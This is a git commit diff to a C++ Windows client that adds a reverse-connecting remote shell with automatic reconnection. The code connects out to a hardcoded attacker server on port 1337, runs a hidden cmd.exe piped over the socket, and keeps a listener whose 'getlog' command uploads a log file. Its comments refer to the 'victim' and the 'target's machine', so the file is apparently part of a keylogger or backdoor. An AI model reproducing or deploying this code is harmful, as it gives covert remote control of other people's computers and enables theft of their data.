1f74202a17e16ebe7d8fadfbe3948c74e1759a1f
Erick Barrera <ebarr019@fiu.edu>
2014-02-28 02:41:43 -0500

    Update Client.cpp
    Added reverse connecting remote shell.
    Added auto reconnect.

--- src/client/library/Client.cpp
+++ src/client/library/Client.cpp
@@ -14,63 +14,142 @@ behind routers. This way we don't need to worry about
 forwarding any ports on the "victim's" end.
 */
 
-//TODO: Create autoreconnect
 Client::Client(void)
 {
-	PCSTR host = "192.168.1.86";
-	PCSTR port = "1337";
+	PCSTR host = "192.168.1.89"; //Adress to server
+	PCSTR port = "1337";         // Port server is listening on  
 	WSADATA wsaData;
 	connectSocket = INVALID_SOCKET;
 	struct addrinfo *result = NULL, *ptr = NULL, hints;
-
 	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
-	if(iResult != 0)
-	{
-		printf("WSAStartup failed with error: %d\n", iResult);
-		exit(1);
-	}
-
 	ZeroMemory(&hints, sizeof(hints));
 	hints.ai_family = AF_UNSPEC;
 	hints.ai_socktype = SOCK_STREAM;
 	hints.ai_protocol = IPPROTO_TCP;
-
 	iResult = getaddrinfo(host, port, &hints, &result);
-
-	if(iResult != 0 )
-	{
-		printf("getaddrinfo failed with error: %d\n", iResult);
-	}
-
 	for(ptr=result; ptr != NULL; ptr=ptr->ai_next)
 	{
 		connectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
-		if(connectSocket == INVALID_SOCKET)
-		{
-			printf("socket failed with error: %d\n", WSAGetLastError());
-			WSACleanup();
-			exit(1);
-		}
-
+		//If server is down attempt reconnect every 5 seconds
 		iResult = connect(connectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
 		if(iResult == SOCKET_ERROR)
 		{
-			closesocket(connectSocket);
-			connectSocket = INVALID_SOCKET;
-			printf("The server is down. Can't connect\n");
+			while(iResult == SOCKET_ERROR)
+			{
+				printf("The server is down. Attempting reconnect in 5 seconds...\n");
+				Sleep(5000);
+				iResult = connect(connectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+			}
 		}
-		//UploadLog();
-		Listen(connectSocket);
+		this->startrshell();		
 	}
 }
 
-/*
-UploadLog is a function to upload the most recent version of the
-log.txt file to our server. 
-TODO:
--Implement periodic uploads i.e. once a day
--Keep this client listening for requests to upload
-*/
+//Creates a remote shell on the target's machine
+//Use netcat to start listening on port 1337
+//for dll to connect (reverse connecting)
+void Client::startrshell(){
+	HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
+   SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, true};
+   STARTUPINFO si;
+   PROCESS_INFORMATION pi;
+   DWORD stuff;
+   //...I'll add proper array size eventually instead of sending 5000 bytes everytime
+   char buff[5000], recvBuff[5000];
+   bool firstsend;
+   int offset = 0, bRecv;
+   if(send(connectSocket, "Lets chat\n", sizeof("Lets chat\n"), 0) == SOCKET_ERROR) goto closeSck;
+   if(!CreatePipe(&stdinRd, &stdinWr, &sa, 0) || !CreatePipe(&stdoutRd, &stdoutWr, &sa, 0)) {
+       send(connectSocket, "Error Creating Pipes For Remote Shell\r\nClosing Connection...", 60, 0);
+       goto closeSck;
+   }
+   GetStartupInfo(&si);
+   si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+   si.wShowWindow = SW_HIDE;
+   si.hStdOutput = stdoutWr;
+   si.hStdError = stdoutWr;                                                                                              
+   si.hStdInput = stdinRd;
+   WCHAR lpath[] = L"cmd.exe";
+   if(!CreateProcess(NULL, lpath, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+       send(connectSocket, "Error Spawning Command Prompt. \r\nClosing Connection...", 52, 0);
+       goto closeSck;
+   }
+   while(1)
+   {
+       Sleep(100);
+       GetExitCodeProcess(pi.hProcess, &stuff);
+       if(stuff != STILL_ACTIVE) break;
+       PeekNamedPipe(stdoutRd, NULL, 0, NULL, &stuff, NULL);
+       if(stuff != 0)
+       {
+       ZeroMemory(buff, sizeof(buff));
+	   ZeroMemory(recvBuff, sizeof(recvBuff));
+       firstsend = true;
+       do {
+               ReadFile(stdoutRd, buff, 5000, &stuff, NULL);
+			   buff[1000] = '\0';
+               if(firstsend)
+               {
+               send(connectSocket, buff, strlen(buff), 0);
+               firstsend = false;
+               }
+               else send(connectSocket, buff, strlen(buff), 0);
+          } while(stuff == 5000);
+       }
+        
+       if(!strcmp(recvBuff, "\r\n")) offset = 0;
+       bRecv = recv(connectSocket, recvBuff, 5000, 0);
+       if((bRecv == 0) || (bRecv == SOCKET_ERROR)) break;
+       recvBuff[bRecv] = '\0';
+       WriteFile(stdinWr, recvBuff, strlen(recvBuff), &stuff, NULL);
+   }
+   closeSck:
+       TerminateProcess(pi.hProcess, 0);
+       CloseHandle(stdinRd);
+       CloseHandle(stdinWr);
+       CloseHandle(stdoutRd);
+       CloseHandle(stdoutWr);
+       closesocket(connectSocket);
+}
+
+//Listens for commands from server in a while loop
+//on a sperate thread created by main.cpp.
+//NOTE: This is only used with your own server
+//      instead of netcat
+void Listen(SOCKET csock)
+{
+	//Commands
+	string COMMAND_TESTBACK = "testback";
+	string COMMAND_GETLOG = "getlog";
+	string input;
+	char recvbuf[1024];
+	int bytes;
+	while(1)
+	{
+		bytes = recv(csock, recvbuf, 1024, 0);
+		if(bytes > 0)
+		{
+			//cout << recvbuf;        //For debugging only
+			//cout << bytes << "\n";  //For debugging only
+			input = string(recvbuf);
+			for(int i = 0; i < 1024; i++)
+			{
+				recvbuf[i] = 0;
+			}
+		}
+		if (input == COMMAND_TESTBACK)
+		{
+			SendTestMesg(csock);
+		}
+		else if(input == COMMAND_GETLOG)
+		{
+			UploadLog(csock);
+		}
+	}
+}
+
+//Used with Listen() to upload log
+//to server
 void UploadLog(SOCKET csock)
 {
 	const int packet_size = 1024;
@@ -88,40 +167,6 @@ void UploadLog(SOCKET csock)
 	strcpy_s(packet_data, line.c_str());
 	send(csock, packet_data, sizeof(packet_data), 0);
 	closesocket(csock);
-}
-
-//Listens for commands from server in a while loop
-//on a sperate thread created by main.cpp.
-void Listen(SOCKET csock)
-{
-	//Commands
-	string COMMAND_TESTBACK = "testback";
-	string COMMAND_GETLOG = "getlog";
-	string input;
-	char recvbuf[1024];
-	int bytes;
-	while(1)
-	{
-		bytes = recv(csock, recvbuf, 1024, 0);
-		if(bytes > 0)
-		{
-			cout << recvbuf; //For debugging only
-			cout << bytes << "\n"; //For debugging only
-			input = string(recvbuf);
-			for(int i = 0; i < 1024; i++)
-			{
-				recvbuf[i] = 0;
-			}
-		}
-		if (input == COMMAND_TESTBACK)
-		{
-			SendTestMesg(csock);
-		}
-		else if(input == COMMAND_GETLOG)
-		{
-			UploadLog(csock);
-		}
-	}
 }
 
 //Sends test message to test connection
